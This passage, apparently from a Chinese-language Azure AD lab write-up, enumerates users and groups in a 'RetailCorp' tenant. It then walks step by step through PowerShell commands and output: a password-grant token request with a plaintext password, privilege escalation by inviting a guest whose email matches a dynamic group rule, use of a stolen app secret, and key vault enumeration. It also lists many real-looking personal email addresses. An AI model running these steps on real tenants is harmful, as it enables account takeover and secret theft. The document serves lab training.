+Test_01                4f424cae-eb37-49cb-8ac8-26bba2bcf855 test1@pracharsh.onmicrosoft.com                         test1_pracharsh.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+invajtoperations       e5dbb516-0cb4-4808-8139-81623478dc93 test1234operations@outlook.com                          test1234operations_outlook.com#EXT#@retailcorp.onmicrosoft.com
+HellAttach             400da82b-22fe-405d-8b83-08c6b8cbb4b3 test2@pracharsh.onmicrosoft.com                         test2_pracharsh.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                c37fa887-700b-4de3-a39d-d75e341b5a10 testbbadmin@testbbhunteradmin.onmicrosoft.com           testbbadmin_testbbhunteradmin.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+tester001              c6b555b4-853c-4c69-8d86-2d323aebc6d8 tester001@tanishsaxena26gmail.onmicrosoft.com           tester001_tanishsaxena26gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Test User              0ab06f86-55e6-4512-9ef6-5c539255ec4f                                                         testlabuser@retailcorp.onmicrosoft.com
+TestPIMUser            b38c4262-c53a-43d1-8989-72cca4577b41                                                         TestPIMUser@retailcorp.onmicrosoft.com
+InvitedPimUser         215dbbe5-fd38-46e2-9a2c-732f72c13da6 testpimuser@foradaz.onmicrosoft.com                     testpimuser_foradaz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       6bcc2757-7f30-4373-9ad3-904be936c79c the_henry_morgan@outlook.com                            the_henry_morgan_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Theresa J Wheeler      9d09d946-9537-4d65-b036-fb02d9fe1154                                                         TheresaJWheeler@retailcorp.onmicrosoft.com
+Thomas B Estrada       9d219f60-6050-4415-833e-36b87a09226a                                                         ThomasBEstrada@retailcorp.onmicrosoft.com
+Thomas K Ferguson      626e8cc6-faf6-490f-90f1-ec15924d4fa0                                                         ThomasKFerguson@retailcorp.onmicrosoft.com
+Thomas N Harrison      d8896deb-29fe-404e-b292-d7491d2525c2                                                         ThomasNHarrison@retailcorp.onmicrosoft.com
+Thomas S Leader        c8a7fdf6-ba58-4b5f-b41d-0b0ae754e1ad                                                         ThomasSLeader@retailcorp.onmicrosoft.com
+Thomas S McFarland     e5b3aa87-1989-4a53-ab24-8fd99e8d8d95                                                         ThomasSMcFarland@retailcorp.onmicrosoft.com
+Timothy E Sewell       bf0a49e6-0c1a-4dc1-b48c-683ec1ecb976                                                         TimothyESewell@retailcorp.onmicrosoft.com
+Timothy G Curtis       95c53844-5c36-412f-9e31-f3bd0beb4994                                                         TimothyGCurtis@retailcorp.onmicrosoft.com
+Timothy R Leitner      75bf4a08-7337-4a08-b7ce-f0260719bed8                                                         TimothyRLeitner@retailcorp.onmicrosoft.com
+InvitedAttacker1       ff179979-eab1-470e-a6db-4d745d062edf tintu2060@outlook.com                                   tintu2060_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       06d3dd7e-87e6-42eb-b6cd-f75432686e38 tintumon2025@outlook.com                                tintumon2025_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Todd I Mendez          fd7f73ec-4a8c-4981-a76b-bd91c9f20557                                                         ToddIMendez@retailcorp.onmicrosoft.com
+InvitedAttacker1       db933cf5-3e4e-4cbe-b1f8-39bf6578697a tofiq-azur3-orucov@outlook.com                          tofiq-azur3-orucov_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       9275549d-75ed-4a96-bd08-7293e0236038 tofiq.orucov1@outlook.com                               tofiq.orucov1_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Tommy C Sullivan       87999fb4-6fdd-4dbf-9f59-c442963f73c4                                                         TommyCSullivan@retailcorp.onmicrosoft.com
+Tracee F Arriola       b0ac6752-f588-4b4f-adce-e31bd9167094                                                         TraceeFArriola@retailcorp.onmicrosoft.com
+Tracy R Castro         75fdd8c3-498f-4d66-ba22-1deef42cacf5                                                         TracyRCastro@retailcorp.onmicrosoft.com
+Travis L Salamanca     0a374dde-f2d0-4d51-8f63-4a31028b4f84                                                         TravisLSalamanca@retailcorp.onmicrosoft.com
+Tyrone G Brown         b5ed601a-08a9-4b23-9604-b99aa8acb330                                                         TyroneGBrown@retailcorp.onmicrosoft.com
+User1                  1f3e712e-1cbc-4138-8b7b-79d957f0eed9 u1@yogisec.onmicrosoft.com                              u1_yogisec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User001                030bf919-2431-457c-a873-322327341b6d user001@cybersek.onmicrosoft.com                        user001_cybersek.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user01                 a47ece35-ce71-4322-905c-ed8ae3a1f2dd user01@aaravtraders.onmicrosoft.com                     user01_aaravtraders.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                82a78d1e-573c-4a66-81af-e48ed0f52d6c User01@andreaintilangeloit.onmicrosoft.com              User01_andreaintilangeloit.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Blah User              047e6ff8-cfb4-4be9-ac19-23c09b88120a user01@armourinfosec.onmicrosoft.com                    user01_armourinfosec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                323a194b-56bb-4fc6-8510-0aaf2942f585 User01@azurepentest2.onmicrosoft.com                    User01_azurepentest2.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                643012e3-8420-4a4c-aa5c-23e4c6c40011 user01@bimsec.onmicrosoft.com                           user01_bimsec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                ed520283-af80-45e3-9e91-752acd30f314 User01@chewzhichao.onmicrosoft.com                      User01_chewzhichao.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 2bca5451-4fc3-44b8-b318-3dba51da0165 User01@danielserbuoutlook.onmicrosoft.com               User01_danielserbuoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 ffe8a0e7-b544-4d71-9c9d-0946d25c1fd0 User01@gonnahack.onmicrosoft.com                        User01_gonnahack.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user01                 940154fe-1019-4c14-b468-ddcc4fa7aae6 user01@lawmankhan.onmicrosoft.com                       user01_lawmankhan.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 2257e0ac-0aed-42c8-8564-738f5a7f5935 User01@lazarazo.onmicrosoft.com                         User01_lazarazo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user01                 0b95e533-425c-4e81-99d8-1369f446ec45 user01@learnadpt.onmicrosoft.com                        user01_learnadpt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 fe293287-0756-44b9-8d82-86e080eee8d8 pim@leo4j.onmicrosoft.com                               pim_leo4j.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 6fe741a0-10ff-4009-a846-2082f5514db8 User01@leowjeremyhotmail.onmicrosoft.com                User01_leowjeremyhotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 9bf8991d-10a1-4609-8362-23428f450512 User01@mrpvr.onmicrosoft.com                            User01_mrpvr.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user01                 8c4a5ee9-7027-4e42-8402-a34cbe0c6277 user01@mrrobotwolfoutlook.onmicrosoft.com               user01_mrrobotwolfoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                87ea7a68-0993-4247-bf57-597bf9bcd4a4 user01@project1337.onmicrosoft.com                      user01_project1337.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                4f484522-83f6-4107-aa37-e7d51da23602 User01@skullcrushers123.onmicrosoft.com                 User01_skullcrushers123.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user01                 bd8ce9f2-ef16-4be1-a2f3-d383afdef89f user01@testenzo.onmicrosoft.com                         user01_testenzo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                8696118c-9f21-4c9a-9fad-7003867e517c User01@thecybermafia.onmicrosoft.com                    User01_thecybermafia.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 b0d1a8a1-d1bf-4789-8e14-aaefc07fee6f User01@wdssa.onmicrosoft.com                            User01_wdssa.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 4444af20-1015-4b96-8fd8-61127b9df4c9 pimadmin@yakirwwwgmail.onmicrosoft.com                  pimadmin_yakirwwwgmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 fba0eaee-ca44-4159-bffd-db21ed4c3bf8 User01@abhijithknamboothiri.onmicrosoft.com             User01_abhijithknamboothiri.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       e876d2d2-1c07-4eac-af58-823b62eedfdb User01@azureadsiva.onmicrosoft.com                      User01_azureadsiva.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 ad6cef8f-4d20-49ef-9a31-a87641f6d8c3 User01@dh0ckdomain1.onmicrosoft.com                     User01_dh0ckdomain1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+rico1989               5a2121e6-76a5-4952-8a9f-70a452780981 user01@funnycorpp.onmicrosoft.com                       user01_funnycorpp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user2                  7663dff2-11e9-4a13-87d1-1e5a8c357a33 user01@leetwhitehatazure.onmicrosoft.com                user01_leetwhitehatazure.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+TotallyNotRelevant     007ade20-8d81-42bb-aaf3-b4c3699e8920 User01@marcingrzesiakdev.onmicrosoft.com                User01_marcingrzesiakdev.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedUser1           d33a8262-152c-4ef6-ac2e-4ecf93cafafd user01@sundeelis.onmicrosoft.com                        user01_sundeelis.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Invitedaaravpim        57cdd74a-f764-438b-a5e5-2c5d28a87be1 user01pim@aaravtraders.onmicrosoft.com                  user01pim_aaravtraders.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+rico1989               162b38cc-e83b-4198-ac74-0022505c2be8 user01pim@funnycorpp.onmicrosoft.com                    user01pim_funnycorpp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       fe6143b0-27b7-43ed-a947-0131a98ba625 User01pim@rootlop.onmicrosoft.com                       User01pim_rootlop.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User02                 feca277a-bedb-4f17-bf75-f1a53b5ec6f6 pimadmin@aadildsjcemedu.onmicrosoft.com                 pimadmin_aadildsjcemedu.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User02                 0de28352-c4c3-4176-a17a-c00c130188e0 User02@dh0ckdomain.onmicrosoft.com                      User02_dh0ckdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+hacks                  0deac22f-7240-463c-9d64-8830c1ffc5b4 user0ha@gta5fk.onmicrosoft.com                          user0ha_gta5fk.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+test user              c8c7763f-4474-4449-ae75-81130c241615 User1@azurevapt.onmicrosoft.com                         User1_azurevapt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user1                  cee1bf16-d1a1-4669-a48a-e0b8c79f382b user1@GeorgeSkouroupathishotmail.onmicrosoft.com        user1_GeorgeSkouroupathishotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user1                  d3c6b1f4-f50b-4641-babf-896ecdbcb9da user1@skullcrushers123.onmicrosoft.com                  user1_skullcrushers123.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+userAD                 34bf3f3f-901f-4278-a374-48f1ff53b77f userAD@learnadpt.onmicrosoft.com                        userAD_learnadpt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker2       b488f0ae-f75e-45d2-aa3e-187082ebf134 userdemotest890090@outlook.com                          userdemotest890090_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pim                    8bfab1da-1e8e-4da9-8fbf-336bdd5071c2 userpim@funnycorpp.onmicrosoft.com                      userpim_funnycorpp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    44ed0a71-0692-4d89-b724-9c7ad3a8d0a8 userpim2@funnycorpp.onmicrosoft.com                     userpim2_funnycorpp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user test              2d576883-d36c-4fc4-b7dc-acb720f22efb usertest@jasoriyaenterprise.onmicrosoft.com             usertest_jasoriyaenterprise.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Vanessa R Pace         1027d2b9-917b-4113-8d5b-0a5b5206e743                                                         VanessaRPace@retailcorp.onmicrosoft.com
+Pimadmin               41a5d1b3-ff57-44cc-8895-1e72ca8b004c varefrieds.11@gmail.com.onmicrosoft.com                 varefrieds.11_gmail.com.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pimadmin               5a14911b-564f-477a-9c31-2eb167d23236 varefriends.11@gmail.com                                varefriends.11_gmail.com#EXT#@retailcorp.onmicrosoft.com
+Pimadmin               850a61b4-b7b2-4f20-92fe-4c719a5a362f varefriends.11@gmail.com.onmicrosoft.com                varefriends.11_gmail.com.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Vicenta D Douglas      72637298-c2df-43c3-b196-c259616bb5cd                                                         VicentaDDouglas@retailcorp.onmicrosoft.com
+Vicente R Murdock      e4cb9b7f-2410-4beb-9ebe-40890df31552                                                         VicenteRMurdock@retailcorp.onmicrosoft.com
+Victor G Dodge         cb88d92d-d412-4611-90db-5dd5548f43fb                                                         VictorGDodge@retailcorp.onmicrosoft.com
+InvitedAttacker1       3f297f02-1412-4d84-af7a-d75d0ea9381d vijay.anand1@hotmail.com                                vijay.anand1_hotmail.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       a2da249d-38f4-4baa-8450-58b1d2a60f46 viluptpimhelljiyashan@outlook.com                       viluptpimhelljiyashan_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       79d23899-45f6-4282-8cd9-ba98f90b68cb Vish@tnj.onmicrosoft.com                                Vish_tnj.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Walter J Johnson       632012e2-7881-4fba-b21a-cd88737fc3ed                                                         WalterJJohnson@retailcorp.onmicrosoft.com
+Walter T Michel        b5f23889-00f6-4cfd-aab7-2d354035a3a4                                                         WalterTMichel@retailcorp.onmicrosoft.com
+Waylon S Luis          9e6df5ac-5277-4891-9bb4-22ef11aa9fd0                                                         WaylonSLuis@retailcorp.onmicrosoft.com
+InvitedAttacker1       2313df20-a3ca-4ba5-b11e-6250a9959da1 whare1cyber@hotmail.com                                 whare1cyber_hotmail.com#EXT#@retailcorp.onmicrosoft.com
+Wilbur S Rodriguez     0e776e65-ba68-4703-b8ba-d95b5f223437                                                         WilburSRodriguez@retailcorp.onmicrosoft.com
+William D Gary         1b267924-ab3a-4fa2-bff2-5697c006887a                                                         WilliamDGary@retailcorp.onmicrosoft.com
+William D Packard      b418d854-aedf-4e70-a8b2-a66745391312                                                         WilliamDPackard@retailcorp.onmicrosoft.com
+William D Zimmerman    62f13f0e-b82f-4b17-82ef-3ca43607cb82                                                         WilliamDZimmerman@retailcorp.onmicrosoft.com
+William J Schaffner    97996abe-4f33-4697-8f9c-4aaa0c442e09                                                         WilliamJSchaffner@retailcorp.onmicrosoft.com
+William L McKinney     f3527640-88a1-4067-a22f-b7d7cb522872                                                         WilliamLMcKinney@retailcorp.onmicrosoft.com
+William L Smith        d858e3c3-8d82-4fdf-9a26-35d15338075f                                                         WilliamLSmith@retailcorp.onmicrosoft.com
+William S Hardesty     56f3c3cf-db3e-4907-84e5-d785b06df9e5                                                         WilliamSHardesty@retailcorp.onmicrosoft.com
+William T Ware         9b809f88-3854-487a-a849-f0361001e392                                                         WilliamTWare@retailcorp.onmicrosoft.com
+wolf1                  794ca22e-73f4-4e4d-a198-180483e5cba1 wolf1@cyberwolf8.onmicrosoft.com                        wolf1_cyberwolf8.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Yolanda J Abel         c77a5e35-b2a7-4346-ac1e-acf910f80a4c                                                         YolandaJAbel@retailcorp.onmicrosoft.com
+Jalu Yudha             8fa770f6-56da-4a2c-b710-e0150cc7a339 yuyud@mitraintegrasingvl.onmicrosoft.com                yuyud_mitraintegrasingvl.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Yvonne T Munoz         8fa6821f-de33-40ff-b71c-abaf786f00c1                                                         YvonneTMunoz@retailcorp.onmicrosoft.com
+Zachary P Belton       8701d4c7-c3ef-4f27-b3f0-5a37d885e14d                                                         ZacharyPBelton@retailcorp.onmicrosoft.com
+InvitedAttacker1       7a8f4430-62b2-4e4d-9dc6-72707f70ad18 ze16operationsfordemo@outlook.com                       ze16operationsfordemo_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Zorro                  136410c3-283b-4cea-9642-c14ed5cbb5de zoro@ichimonjo.inmicrosoft.com                          zoro_ichimonjo.inmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+
+# 枚举组
+PS D:\_Tools\MicroBurst> Get-MgGroup -All
+
+DisplayName         Id                                   MailNickname Description                                                            GroupTypes
+-----------         --                                   ------------ -----------                                                            ----------
+Finance             359dfa24-0a48-495d-8646-b8a9ab01c13d False                                                                               {}
+Marketing           35bd7eee-d537-474f-b9a3-9756a8f0ba68 False                                                                               {}
+Network Operations  49e58be7-16fd-48ec-a9e5-f40feef4adf6 False                                                                               {}
+Human Resources     58764583-5791-4627-8731-8411db4ba338 False                                                                               {}
+Security Operations 62f656b3-e8c9-452c-85ce-104a8d0baaf5 False                                                                               {}
+PIMAdmins           750d8501-0ad2-4039-b587-993794f6cbd7 27040ef8-9   Members of this group have privileges to manage privileged identities. {DynamicMembership}
+HelpDesk            777643e6-e814-4abb-8caf-195a3e859325 False                                                                               {}
+GRC                 80c6d793-acc0-4ba6-bf17-d4048763999b False                                                                               {}
+DevOps              80f8306b-fe8c-4f1e-9474-1457d4361375 False                                                                               {}
+Network Security    a8418db9-8153-43ef-b37e-59fb7d88aaff False                                                                               {}
+Hardware Mgmt       c85146db-e493-4708-bbeb-38eb46441c62 False                                                                               {}
+Lab Users           cf0335f3-3026-418d-a84f-dc680d729757 bb7956ab-8                                                                          {}
+Sales               ff51087c-6a1a-4304-af8c-7e446027e86d False                                                                               {}
+```
+
+</details>
+
+接下来，尝试枚举能访问的资源
+
+新建一个 Powershell 窗口进行操作
+
+```powershell
+$body = @{
+    client_id     = "1950a258-227b-4e31-a9cf-717495945fc2"
+    scope         = "https://management.azure.com/.default"
+    username      = "PIMUser@retailcorp.onmicrosoft.com"
+    password      = 'ZuqK&ijv0085VnCI&#'
+    grant_type    = "password"
+}
+$userAgent = "Mozilla/5.0 (Linux; Android 12; RMX3491) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
+$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/v2.0/token" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $userAgent
+$ARMToken = ($response.access_token)
+Connect-AzAccount -AccessToken $ARMToken -AccountId "PIMUser@retailcorp.onmicrosoft.com"
+Get-AzContext | Format-List *
+```
+
+执行结果：
+
+```powershell
+PS C:\Users\Randark> $body = @{
+>>     client_id     = "1950a258-227b-4e31-a9cf-717495945fc2"
+>>     scope         = "https://management.azure.com/.default"
+>>     username      = "PIMUser@retailcorp.onmicrosoft.com"
+>>     password      = 'ZuqK&ijv0085VnCI&#'
+>>     grant_type    = "password"
+>> }
+PS C:\Users\Randark> $userAgent = "Mozilla/5.0 (Linux; Android 12; RMX3491) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
+PS C:\Users\Randark> $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/v2.0/token" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $userAgent
+PS C:\Users\Randark> $ARMToken = ($response.access_token)
+PS C:\Users\Randark> Connect-AzAccount -AccessToken $ARMToken -AccountId "PIMUser@retailcorp.onmicrosoft.com"
+
+Subscription name Tenant
+----------------- ------
+                  Retail Corporation
+
+PS C:\Users\Randark> Get-AzContext | Format-List *
+
+Name               : 711c59fe-8dee-40c0-adc1-ed08f738de43 - PIMUser@retailcorp.onmicrosoft.com
+Subscription       :
+Account            : PIMUser@retailcorp.onmicrosoft.com
+Environment        : AzureCloud
+Tenant             : 711c59fe-8dee-40c0-adc1-ed08f738de43
+TokenCache         :
+VersionProfile     :
+ExtendedProperties : {}
+```
+
+尝试列出有权限访问的资源
+
+```powershell
+PS D:\_Tools\MicroBurst> Get-AzContext
+
+   Tenant: Retail Corporation (711c59fe-8dee-40c0-adc1-ed08f738de43)
+
+SubscriptionName SubscriptionId Account                            Environment
+---------------- -------------- -------                            -----------
+                                PIMUser@retailcorp.onmicrosoft.com AzureCloud
+
+PS D:\_Tools\MicroBurst> Get-AzSubscription
+PS D:\_Tools\MicroBurst> Get-AzResource
+Get-AzResource: 'this.Client.SubscriptionId' cannot be null.
+```
+
+换个角度，尝试枚举动态群组
+
+```powershell
+PS D:\_Tools\MicroBurst> Get-MgGroup -Filter "securityEnabled eq true and groupTypes/any(c:c eq 'DynamicMembership')"
+
+DisplayName Id                                   MailNickname Description                                                            GroupTypes
+----------- --                                   ------------ -----------                                                            ----------
+PIMAdmins   750d8501-0ad2-4039-b587-993794f6cbd7 27040ef8-9   Members of this group have privileges to manage privileged identities. {DynamicMembership}
+```
+
+已知动态群组的存在，那么查询动态群组的条件
+
+```powershell
+PS D:\_Tools\MicroBurst> (Get-MgGroup -GroupId 750d8501-0ad2-4039-b587-993794f6cbd7).MembershipRule
+(user.mail -contains "pim") or (user.mail -contains "pimadmin") or (user.mail -contains "operations") and (user.userType -eq "guest")
+```
+
+也就意味着，任何邮箱地址中包含 `pim` 字符串，或者，邮箱地址中包含 `pimadmin` 字符串，或者，同时满足邮箱地址中包含 `operations` 字符串并且用户类型为 `guest` 的用户，为 `PIMAdmins` 这个动态群组的成员
+
+可以获得：
+
+- `Name of the dynamic group in RetailCorp tenant` - `PIMAdmins`
+- `Name of the attribute of a dynamic group that contains rule for membership` - `MembershipRule`
+
+### Privilege Escalation - 特权升级
+
+已经知道 `PIMAdmins` 动态群组的权限分配规则之后，可以尝试做一个满足条件的邮箱地址出来，这里我使用的是自己的域名邮箱 `redlabs_pimadmin@randark.site`
+
+给这个邮箱发送一个邀请
+
+```powershell
+New-MgInvitation -InvitedUserDisplayName "InvitedAttacker1" -InvitedUserEmailAddress redlabs_pimadmin@randark.site -InviteRedirectUrl "https://portal.azure.com" -SendInvitationMessage:$true
+```
+
+![img](img/image_20260120-212007.png)
+
+同时，可以在邀请的同时，直接获取到邀请信息
+
+```powershell
+PS D:\_Tools\MicroBurst> New-MgInvitation -InvitedUserDisplayName "InvitedAttacker1" -InvitedUserEmailAddress redlabs_pimadmin@randark.site -InviteRedirectUrl "https://portal.azure.com" -SendInvitationMessage:$true | Format-List *
+
+Id                      : 98442d35-17ac-4215-91b6-4084da0ab48f
+InviteRedeemUrl         : https://login.microsoftonline.com/redeem?rd=https%3a%2f%2finvitations.microsoft.com%2fredeem%2f%3ftenant%3d711c59fe-8dee-40c0-adc1-ed08f738de43%26user%3d98442d35-17ac-4215-91b6-4084da0ab48f%26ticket%3dYNr%25252fuF4Gn1kIf0h5afWgh83XaVtaBaA0g78LNP1u3dY%25253d%26ver%3d2.0
+InviteRedirectUrl       : https://portal.azure.com/
+InvitedUser             : Microsoft.Graph.PowerShell.Models.MicrosoftGraphUser
+InvitedUserDisplayName  : InvitedAttacker1
+InvitedUserEmailAddress : redlabs_pimadmin@randark.site
+InvitedUserMessageInfo  : Microsoft.Graph.PowerShell.Models.MicrosoftGraphInvitedUserMessageInfo
+InvitedUserSponsors     :
+InvitedUserType         : Guest
+ResetRedemption         : False
+SendInvitationMessage   : True
+Status                  : PendingAcceptance
+AdditionalProperties    : {[@odata.context, https://graph.microsoft.com/v1.0/$metadata#invitations/$entity]}
+```
+
+使用 InviteRedeemUrl 进行访问，可以看到
+
+![img](img/image_20260121-212105.png)
+
+接受邀请后，在登陆选项部分，使用域名访问组织
+
+![img](img/image_20260122-212235.png)
+
+即可进入组织账户界面
+
+![img](img/image_20260124-212425.png)
+
+查看所有资源
+
+![img](img/image_20260124-212441.png)
+
+可以看到名为 `retailcorp` 的储存账户
+
+![img](img/image_20260126-212602.png)
+
+查看 `pimadmins` 容器的内容
+
+![img](img/image_20260126-212623.png)
+
+```json title="PIM.json"
+{
+    "id": "db52c567-6d80-4675-9c80-4211811daaaa",
+    "acceptMappedClaims": null,
+    "accessTokenAcceptedVersion": null,
+    "addIns": [],
+    "allowPublicClient": false,
+    "appId": "20eb5f4e-317a-4987-a384-298bf636f082",
+    "appRoles": [
+        {
+            "allowedMemberTypes": [
+                "User"
+            ],
+            "description": "User",
+            "displayName": "User",
+            "id": "18d14569-c3bd-439b-9a66-3a2aee01d14f",
+            "isEnabled": true,
+            "lang": null,
+            "origin": "Application",
+            "value": null
+        },
+        {
+            "allowedMemberTypes": [
+                "User"
+            ],
+            "description": "msiam_access",
+            "displayName": "msiam_access",
+            "id": "b9632174-c057-4f7e-951b-be3adc52bfe6",
+            "isEnabled": true,
+            "lang": null,
+            "origin": "Application",
+            "value": null
+        }
+    ],
+    "oauth2AllowUrlPathMatching": false,
+    "createdDateTime": "2021-12-02T06:44:12Z",
+    "certification": null,
+    "disabledByMicrosoftStatus": null,
+    "groupMembershipClaims": null,
+    "identifierUris": [],
+    "informationalUrls": {
+        "termsOfService": null,
+        "support": null,
+        "privacy": null,
+        "marketing": null
+    },
+    "keyCredentials": [],
+    "knownClientApplications": [],
+    "logoUrl": null,
+    "logoutUrl": null,
+    "name": "PIM",
+    "oauth2AllowIdTokenImplicitFlow": true,
+    "oauth2AllowImplicitFlow": false,
+    "oauth2Permissions": [
+        {
+            "adminConsentDescription": "Allow the application to access PIM on behalf of the signed-in user.",
+            "adminConsentDisplayName": "Access PIM",
+            "id": "c3f75f10-255f-4445-a465-0cc53de7003e",
+            "isEnabled": true,
+            "lang": null,
+            "origin": "Application",
+            "type": "User",
+            "userConsentDescription": "Allow the application to access PIM on your behalf.",
+            "userConsentDisplayName": "Access PIM",
+            "value": "user_impersonation"
+        }
+    ],
+    "oauth2RequirePostResponse": false,
+    "optionalClaims": null,
+    "orgRestrictions": [],
+    "parentalControlSettings": {
+        "countriesBlockedForMinors": [],
+        "legalAgeGroupRule": "Allow"
+    },
+    "passwordCredentials": [
+        {
+            "customKeyIdentifier": null,
+            "endDate": "2025-12-09T06:44:44.945Z",
+            "keyId": "4e63ebba-c6ca-4955-a039-c74c7771c81f",
+            "startDate": "2021-12-02T06:44:44.945Z",
+            "value": "7pv8Q~***********************FTmQ3uZbAc",
+            "createdOn": "2023-12-10T06:45:03.1827138Z",
+            "hint": "_6i",
+            "displayName": "Creds"
+        }
+    ],
+    "preAuthorizedApplications": [],
+    "publisherDomain": "retailcorp.onmicrosoft.com",
+    "replyUrlsWithType": [],
+    "requiredResourceAccess": [],
+    "samlMetadataUrl": null,
+    "signInUrl": "https://account.activedirectory.windowsazure.com:444/applications/default.aspx?metadata=customappsso|ISV9.1|primary|z",
+    "signInAudience": "AzureADMyOrg",
+    "tags": [],
+    "tokenEncryptionKeyId": null
+}
+```
+
+可以获得：
+
+- `Name of the container that the guest user can read after it is added to the dynamic group` - `PIMAdmins`
+- `AppId of the application whose backup is present in the container readable by the guest` - `20eb5f4e-317a-4987-a384-298bf636f082`
+
+### Lateral Movement - 横向移动
+
+在上文已经获得 PIM app 的凭据的情况下，尝试访问
+
+```powershell
+$password = ConvertTo-SecureString '7pv8Q~***********************FTmQ3uZbAc' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('20eb5f4e-317a-4987-a384-298bf636f082', $password)
+Connect-AzAccount -ServicePrincipal -Tenant "711c59fe-8dee-40c0-adc1-ed08f738de43" -Credential $creds 
+```
+
+执行结果：
+
+```powershell
+PS C:\Users\Randark> $password = ConvertTo-SecureString '7pv8Q~***********************FTmQ3uZbAc' -AsPlainText -Force
+PS C:\Users\Randark> $creds = New-Object System.Management.Automation.PSCredential('20eb5f4e-317a-4987-a384-298bf636f082', $password)
+PS C:\Users\Randark> Connect-AzAccount -ServicePrincipal -Tenant "711c59fe-8dee-40c0-adc1-ed08f738de43" -Credential $creds
+
+Subscription name Tenant
+----------------- ------
+RetailCorp        711c59fe-8dee-40c0-adc1-ed08f738de43
+```
+
+接下来枚举能够访问的资源
+
+```powershell
+PS C:\Users\Randark>  Get-AzResource
+
+Name              : breakglass-vault
+ResourceGroupName : Retail
+ResourceType      : Microsoft.KeyVault/vaults
+Location          : germanywestcentral
+ResourceId        : /subscriptions/27ebe5b9-6e27-425a-8117-eeaab022575f/resourceGroups/Retail/providers/Microsoft.KeyVault/vaults/breakglass-vault
+Tags              :
+```
+
+可以在其中发现一个 key Vault 对象，尝试访问这个对象
+
+```powershell
+PS C:\Users\Randark>  Get-AzKeyVaultSecret -VaultName breakglass-vault
+
+Vault Name   : breakglass-vault
+Name         : PrivilegedAccess
+Version      :
+Id           : https://breakglass-vault.vault.azure.net:443/secrets/PrivilegedAccess
+Enabled      : True
+Expires      :
+Not Before   :
+Created      : 2021/12/9 19:18:22
+Updated      : 2021/12/9 19:18:22
